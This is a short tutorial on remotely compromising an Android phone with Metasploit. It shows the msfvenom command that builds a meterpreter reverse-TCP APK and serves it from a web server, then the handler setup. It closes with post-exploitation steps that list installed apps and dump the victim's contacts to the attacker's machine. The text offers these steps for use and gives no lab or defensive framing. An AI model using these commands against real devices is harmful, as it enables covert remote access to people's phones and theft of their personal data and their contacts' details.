# Hacking Android phone remotely using Metasploit



Step 1: Generating a Payload with msfvenom 

\# msfvenom –p android/meterpreter/reverse\_tcp LHOST=192.168.0.112 LPORT=4444 R>/var/www/html/ehacking.apk 



Step 2: Launching an Attack 

Before launching attack, we need to check the status of 

the apache server. Type command: # service apache2 status 



now fire up msfconsole. 

Use multi/handler 

exploit, 

set payload the same as generated previously, 

set LHOST and LPORT values same as used in payload and 

finally type exploit to launch an attack.  





#### Post Exploitation :



Type “background” and then “sessions” to list down all 

the sessions from where you can see all the IPs connected 

to the machine.  



Type “app\_list” and it will show you all the installed 

apps on the device 



#### Extracting Contacts from an Android Device :



Type “dump\_contacts” and enter



It will extract all the contacts from the Android device 

and will save it in our local directory. To see this file type 

“ls” and “cat \[file\_name]”  



